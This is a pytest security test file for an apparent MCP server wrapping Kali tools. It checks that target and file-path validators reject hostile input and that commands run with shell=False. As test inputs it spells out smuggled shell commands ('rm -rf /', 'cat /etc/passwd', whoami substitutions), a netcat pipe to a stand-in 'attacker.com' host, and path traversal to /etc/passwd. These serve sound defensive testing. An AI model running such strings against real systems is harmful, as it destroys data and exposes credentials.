#!/usr/bin/env python3
"""
Security tests for MCP Kali Server

These tests verify security features and input validation.
"""

import pytest
import sys
import os

# Add parent directory to path to import modules
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))


class TestInputValidation:
    """Test input validation functions"""

    def test_validate_target_normal(self):
        """Test that validate_target accepts normal targets"""
        from kali_server import validate_target

        assert validate_target("192.168.1.1") is True
        assert validate_target("example.com") is True
        assert validate_target("http://example.com") is True
        assert validate_target("http://example.com:8080/path") is True

    def test_validate_target_rejects_injection(self):
        """Test that validate_target rejects injection attempts"""
        from kali_server import validate_target

        # Test command injection attempts
        assert validate_target("192.168.1.1; rm -rf /") is False
        assert validate_target("example.com && cat /etc/passwd") is False
        assert validate_target("test.com | nc attacker.com 1234") is False
        assert validate_target("test.com`whoami`") is False
        assert validate_target("test.com$(whoami)") is False

    def test_validate_target_rejects_empty(self):
        """Test that validate_target rejects empty input"""
        from kali_server import validate_target

        assert validate_target("") is False
        assert validate_target(None) is False

    def test_validate_target_rejects_too_long(self):
        """Test that validate_target rejects overly long input"""
        from kali_server import validate_target

        long_string = "a" * 501
        assert validate_target(long_string) is False

    def test_validate_file_path_normal(self):
        """Test that validate_file_path accepts normal paths"""
        from kali_server import validate_file_path

        assert validate_file_path("/usr/share/wordlists/rockyou.txt") is True
        assert validate_file_path("/tmp/hashes.txt") is True
        assert validate_file_path("/home/user/test.txt") is True

    def test_validate_file_path_rejects_traversal(self):
        """Test that validate_file_path rejects path traversal"""
        from kali_server import validate_file_path

        assert validate_file_path("/etc/../../etc/passwd") is False
        assert validate_file_path("../../../etc/passwd") is False
        assert validate_file_path("/tmp/../etc/passwd") is False

    def test_validate_file_path_rejects_injection(self):
        """Test that validate_file_path rejects injection attempts"""
        from kali_server import validate_file_path

        assert validate_file_path("/tmp/file; rm -rf /") is False
        assert validate_file_path("/tmp/file && whoami") is False
        assert validate_file_path("/tmp/file | cat") is False


class TestCommandExecution:
    """Test command execution functionality"""

    def test_execute_command_with_list(self):
        """Test execute_command with list input"""
        from kali_server import execute_command

        result = execute_command(["echo", "test"])
        assert result["success"] is True
        assert "test" in result["stdout"]

    def test_execute_command_with_string(self):
        """Test execute_command with string input (should be converted to list)"""
        from kali_server import execute_command

        result = execute_command("echo test")
        assert result["success"] is True
        assert "test" in result["stdout"]

    def test_execute_command_with_complex_args(self):
        """Test execute_command with complex arguments"""
        from kali_server import execute_command

        # Test with quoted arguments
        result = execute_command('echo "hello world"')
        assert result["success"] is True
        assert "hello world" in result["stdout"]

    def test_execute_command_empty(self):
        """Test execute_command with empty input"""
        from kali_server import execute_command

        result = execute_command("")
        assert result["success"] is False
        assert "Empty command" in result["stderr"]

    def test_execute_command_invalid_parsing(self):
        """Test execute_command with unparseable input"""
        from kali_server import execute_command

        # Unclosed quote should fail parsing
        result = execute_command('echo "unclosed')
        assert result["success"] is False
        assert "Error parsing command" in result["stderr"]


class TestCommandExecutor:
    """Test CommandExecutor class"""

    def test_command_executor_with_list(self):
        """Test CommandExecutor with list input"""
        from kali_server import CommandExecutor

        executor = CommandExecutor(["echo", "test"], timeout=10)
        assert executor.command == ["echo", "test"]
        assert executor.timeout == 10

        result = executor.execute()
        assert result["success"] is True
        assert "test" in result["stdout"]


class TestSecurityFeatures:
    """Test overall security features"""

    def test_command_allowlist_exists(self):
        """Test that COMMAND_ALLOWLIST is properly defined"""
        from kali_server import COMMAND_ALLOWLIST

        assert isinstance(COMMAND_ALLOWLIST, dict)
        assert len(COMMAND_ALLOWLIST) > 0

        # Verify allowlist contains only lists of commands
        for key, value in COMMAND_ALLOWLIST.items():
            assert isinstance(value, list)
            assert len(value) > 0

    def test_shell_false_in_executor(self):
        """Test that CommandExecutor uses shell=False"""
        import inspect
        from kali_server import CommandExecutor

        # Get the source code of the execute method
        source = inspect.getsource(CommandExecutor.execute)

        # Verify shell=False is used
        assert "shell=False" in source


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
